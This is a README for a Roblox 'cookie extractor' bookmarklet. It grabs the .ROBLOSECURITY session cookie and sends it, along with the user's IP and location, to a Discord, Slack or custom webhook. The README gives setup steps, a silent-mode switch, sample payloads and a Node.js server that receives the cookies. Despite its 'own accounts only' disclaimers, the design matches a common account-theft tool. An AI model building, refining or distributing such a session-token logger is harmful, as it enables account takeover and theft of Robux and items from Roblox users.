# 🍪 Roblox Cookie Extractor with Webhook Integration

A JavaScript bookmark that extracts your Roblox authentication cookie and automatically sends it to your webhook (Discord, Slack, or custom server) for personal automation and legitimate use.

## ⚠️ Critical Security Notice

**This tool sends your Roblox cookie to YOUR webhook. Make sure:**
- You own and control the webhook URL
- The webhook URL is secure (HTTPS)
- You trust where the data is being sent
- Never use untrusted webhook URLs

## 🔧 Setup Instructions

### Step 1: Configure Your Webhook

Before using the bookmark, you need to set up your webhook URL. Open `roblox-cookie-bookmark-with-webhook.js` and modify the configuration section:

```javascript
// ===== CONFIGURATION =====
const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE'; // Replace with your actual webhook
const SHOW_POPUP = true; // Set to false to only send to webhook (no popup)
const WEBHOOK_FORMAT = 'discord'; // 'discord', 'slack', or 'custom'
```

### Step 2: Get Your Webhook URL

#### For Discord Webhooks:
1. Go to your Discord server
2. Right-click on the channel where you want messages
3. Select "Edit Channel" → "Integrations" → "Webhooks"
4. Create a new webhook and copy the URL
5. Example URL: `https://discord.com/api/webhooks/123456789/abcdefghijklmnop`

#### For Slack Webhooks:
1. Go to your Slack workspace
2. Create an incoming webhook app
3. Copy the webhook URL
4. Set `WEBHOOK_FORMAT = 'slack'` in the configuration

#### For Custom Webhooks:
1. Use any HTTP endpoint that accepts POST requests
2. Set `WEBHOOK_FORMAT = 'custom'` for a generic JSON payload
3. Your server will receive a JSON object with cookie, timestamp, and location data

### Step 3: Create the Bookmark

1. **Copy the configured code:**
   - Edit `roblox-cookie-bookmark-with-webhook.js` with your webhook URL
   - Copy the entire JavaScript code

2. **Create bookmark:**
   - Right-click your browser's bookmark bar
   - Select "Add page" or "Add bookmark"
   - Name: `Get Roblox Cookie + Webhook`
   - URL: Paste the JavaScript code
   - Save

## 📱 Usage

### Basic Usage:
1. Login to [roblox.com](https://roblox.com)
2. Navigate to any Roblox page
3. Click your bookmark
4. Your cookie will be extracted and sent to your webhook automatically

### Webhook Payload Examples:

#### Discord Format:
```json
{
  "content": "🍪 **Roblox Cookie Extracted**\n```\nCookie: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_[COOKIE_VALUE]\nTime: 12/5/2024, 3:45:12 PM\nLocation: New York, United States\nIP: 192.168.1.1\n```",
  "username": "Roblox Cookie Bot"
}
```

#### Custom Format:
```json
{
  "cookie": "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_[COOKIE_VALUE]",
  "timestamp": "12/5/2024, 3:45:12 PM",
  "location": {
    "ip": "192.168.1.1",
    "country": "United States",
    "region": "New York", 
    "city": "New York"
  },
  "source": "roblox-cookie-bookmark"
}
```

## ⚙️ Configuration Options

### WEBHOOK_URL
- **Required**: Your webhook endpoint URL
- **Security**: Must be HTTPS for production use
- **Example**: `https://discord.com/api/webhooks/...`

### SHOW_POPUP
- **Default**: `true`
- **Description**: Shows a popup with cookie details
- **Set to `false`**: For silent operation (webhook only)

### WEBHOOK_FORMAT
- **Options**: `'discord'`, `'slack'`, `'custom'`
- **Discord**: Formatted message for Discord channels
- **Slack**: Slack-compatible attachment format
- **Custom**: Generic JSON payload for custom servers

## 🔍 Features

### Automatic Cookie Detection
- Extracts `.ROBLOSECURITY` cookie from browser
- Fallback methods for different storage locations
- Validates cookie format and length

### Location Tracking
- Includes IP address and geographic location
- Helps identify where the cookie was extracted
- Uses secure IP geolocation APIs

### Webhook Integration
- Supports multiple webhook formats
- Automatic retry functionality
- Error handling and status reporting

### Security Features
- Domain validation (only works on roblox.com)
- Secure HTTPS requests
- No external dependencies beyond IP location service

## 🛠️ Troubleshooting

### Webhook Not Receiving Data
1. **Check URL**: Verify your webhook URL is correct
2. **Test webhook**: Send a test message to confirm it works
3. **Check browser console**: Look for error messages (F12)
4. **CORS issues**: Some webhooks may block browser requests

### Cookie Not Found
1. **Login status**: Make sure you're logged into Roblox
2. **Clear cache**: Try clearing browser cookies and re-login
3. **Different page**: Try the bookmark on various Roblox pages
4. **Browser compatibility**: Test on different browsers

### Location Detection Fails
- Location detection is optional and won't prevent cookie extraction
- Check browser console for API errors
- Some corporate networks may block IP location services

## 🔐 Advanced Security Setup

### For Production Use:
1. **Use HTTPS webhooks only**
2. **Implement webhook authentication/tokens**
3. **Set up rate limiting on your webhook**
4. **Monitor webhook logs for suspicious activity**
5. **Consider encrypting cookie data before sending**

### Server-Side Webhook Handler Example (Node.js):
```javascript
const express = require('express');
const app = express();

app.use(express.json());

app.post('/roblox-webhook', (req, res) => {
    const { cookie, timestamp, location } = req.body;
    
    // Validate request
    if (!cookie || !cookie.startsWith('_|WARNING:')) {
        return res.status(400).json({ error: 'Invalid cookie format' });
    }
    
    // Store securely (encrypt, database, etc.)
    console.log('Received Roblox cookie:', {
        timestamp,
        location: location.city + ', ' + location.country,
        cookieLength: cookie.length
    });
    
    // Don't log the actual cookie for security
    res.json({ success: true });
});

app.listen(3000);
```

## 🎯 Use Cases

- **Personal Automation**: Using your cookie in legitimate scripts
- **Account Management**: Multiple account management tools
- **API Development**: Testing Roblox APIs with authentication
- **Data Backup**: Securing your session information
- **Development Tools**: Building Roblox-related applications

## ⚖️ Legal and Ethical Use

- ✅ **Use only with your own Roblox accounts**
- ✅ **Comply with Roblox Terms of Service**
- ✅ **Secure webhook endpoints**
- ✅ **Personal automation and development**

- ❌ **Never steal other users' cookies**
- ❌ **Don't violate Roblox ToS**
- ❌ **No malicious activities**
- ❌ **Don't share cookies with untrusted parties**

---

**Remember: This tool is for legitimate personal use only. Always ensure your webhook is secure and never share your Roblox cookie with anyone you don't trust completely.**